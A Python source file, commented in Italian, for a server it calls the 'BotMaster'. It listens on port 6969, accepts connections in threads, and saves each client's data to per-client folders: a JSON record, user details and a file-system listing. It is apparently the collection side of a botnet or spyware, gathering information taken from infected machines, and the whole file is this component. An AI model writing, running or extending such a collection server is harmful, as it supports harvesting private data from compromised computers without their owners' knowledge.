# Questo file rappresenta il server, il BotMaster.
import json
import socket
import pprint
import struct

from _thread import *

pp = pprint.PrettyPrinter(indent=4)

PORT = 6969
SERVER = socket.gethostbyname(socket.gethostname())
FORMAT = 'utf-8'
SUCCESSFUL_RESPONSE = 'ok'


class BotMaster:
    def __init__(self):
        self.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.start()

    def __del__(self):
        self.serverSocket.close()

    def start(self):
        """
        Procedura tramite la quale il server, una volta attivato, resta in attesa di connessione con il client.
        :return: None
        """
        self.serverSocket.bind(('', PORT))
        self.serverSocket.listen()
        print('The server is ready to receive!')
        self.waitForClient()

    def client_thread(self, client, client_id):
        data = self.recv_msg(client).decode(FORMAT)

        dict = json.loads(data)
        pp.pprint(dict)

        with open(f'{client_id}/data.json', 'w') as fp:
            json.dump(dict, fp, indent=4)

        data = self.recv_msg(client).decode(FORMAT)
        with open(f'{client_id}/user.txt', 'w', encoding=FORMAT) as fp:
            fp.write(data)

        data = self.recv_msg(client).decode(FORMAT)
        with open(f'{client_id}/fileSystem.txt', 'w', encoding=FORMAT) as fp:
            fp.write(data)

        client.close()

    def waitForClient(self):
        """
        Procedura tramite la quale il server accetta la richiesta di connessione del client e salva i dati ricevuti in un file .json.
        :return: None
        """
        i = 1
        while True:
            connection, addr = self.serverSocket.accept()
            print('The connection has been accepted! Client ip address: ', addr[0])

            # start client thread
            start_new_thread(self.client_thread, (connection, i))
            i += 1

    def recv_msg(self, conn):
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        data = bytearray()
        while len(data) < n:
            packet = conn.recv(n - len((data)))
            if not packet:
                return None
            data.extend(packet)
        return data


if __name__ == '__main__':
    server = BotMaster()